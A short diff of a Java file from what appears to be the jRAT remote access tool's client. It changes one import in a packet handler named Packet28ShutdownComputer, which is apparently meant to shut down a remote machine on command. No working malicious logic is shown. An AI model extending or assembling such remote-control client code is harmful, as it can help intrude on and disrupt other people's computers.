@@ -1,7 +1,7 @@
 package jrat.client.packets.incoming;
 
 import jrat.client.Connection;
-import io.jrat.common.Constants;
+import jrat.common.Constants;
 import oslib.OperatingSystem;
 
 public class Packet28ShutdownComputer extends AbstractIncomingPacket {
